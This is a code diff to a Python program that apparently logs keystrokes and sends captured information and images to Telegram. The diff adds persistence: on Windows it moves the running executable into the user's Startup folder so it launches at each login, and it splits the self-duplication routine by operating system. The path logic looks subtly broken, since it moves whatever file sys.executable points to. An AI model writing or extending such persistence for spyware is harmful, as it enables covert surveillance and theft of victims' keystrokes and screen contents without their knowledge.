@@ -6,9 +6,71 @@ from log_utils import write_to_log, format_message, process_keys
 from telegram_utils import load_credentials_telegram_from_script, send_info_telegram, send_image_telegram, load_credentials_telegram
 from constants import AUTOSTART_CONTENT, DUPLICATE_NAME_FILE, AUTOSTART_DIR, DUPLICATE_EXE_DIR, IMG_DIR, IMG_FILE, LOG_FILE, LOG_FILE_2
 
+def is_windows():
+    """
+    https://stackoverflow.com/questions/1854/how-to-identify-which-os-python-is-running-on
+    https://stackoverflow.com/questions/1325581/how-do-i-check-if-im-running-on-windows-in-python
+
+    Check if the current operating system is Windows.
+
+    Returns:
+        bool: True if the current operating system is Windows, False otherwise.
+    """
+    return os.name == 'nt'
+
 def create_autostart_entry():
     """
-    Creates an autostart entry for the application.
+    Creates an autostart entry based on the operating system.
+
+    The function checks if the current operating system is Windows by calling the `is_windows()` function.
+    If the operating system is Windows, the function calls the `create_autostart_entry_win()` function to create the autostart entry.
+    If the operating system is not Windows, the function calls the `create_autostart_entry_linux()` function to create the autostart entry.
+
+    Parameters:
+    None
+
+    Returns:
+    None
+    """
+    if is_windows():
+        create_autostart_entry_win()
+    else:
+        create_autostart_entry_linux()
+
+def create_autostart_entry_win():
+    """
+    https://stackoverflow.com/questions/33178838/python-code-for-program-to-add-itself-to-start-up-windows
+
+    Creates an autostart entry for the application in windows systems.
+
+    This function creates an autostart entry for the application by checking if the desktop entry file already exists. If the file does not exist, it creates a new file with the specified content and prints the path of the created autostart entry. If the file already exists, it prints the path of the existing autostart entry.
+
+    Parameters:
+        None
+
+    Returns:
+        None
+    """
+    aup = os.environ.get("ALLUSERSPROFILE")
+    up = os.environ.get("USERPROFILE")
+
+    if aup and up:
+        script_folder = os.path.dirname(os.path.abspath(sys.argv[0]))
+        source_path = os.path.join(script_folder, sys.executable)
+        destination_path = os.path.join(up, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", DUPLICATE_NAME_FILE)
+
+        # Check if the file is already in the startup folder
+        if not os.path.exists(destination_path):
+            shutil.move(source_path, destination_path)
+            print(f"File '{DUPLICATE_NAME_FILE}' moved to startup folder successfully.")
+        else:
+            print(f"File '{DUPLICATE_NAME_FILE}' is already in the startup folder.")
+    else:
+        print("Oops, couldn't look up stuff in os.environ")
+
+def create_autostart_entry_linux():
+    """
+    Creates an autostart entry for the application in linux systems.
 
     This function creates an autostart entry for the application by checking if the desktop entry file already exists. If the file does not exist, it creates a new file with the specified content and prints the path of the created autostart entry. If the file already exists, it prints the path of the existing autostart entry.
 
@@ -35,7 +97,36 @@ def create_autostart_entry():
 
 def duplicate_script():
     """
-    Generates a duplicate script by copying the current script executable to a specified directory.
+    Duplicate the script for the current operating system.
+
+    This function checks the operating system using the `is_windows()` function and calls the appropriate platform-specific function to duplicate the script. If the operating system is Windows, it calls the `duplicate_script_win()` function. Otherwise, it calls the `duplicate_script_linux()` function.
+
+    Parameters:
+        None
+
+    Returns:
+        None
+    """
+    if is_windows():
+        duplicate_script_win()
+    else:
+        duplicate_script_linux()
+        
+def duplicate_script_win():
+    """
+    Generates a duplicate script by copying the current script executable to a specified directory in windows systems.
+
+    Parameters:
+        None
+
+    Returns:
+        None
+    """
+    pass
+
+def duplicate_script_linux():
+    """
+    Generates a duplicate script by copying the current script executable to a specified directory in linux systems.
 
     Parameters:
         None
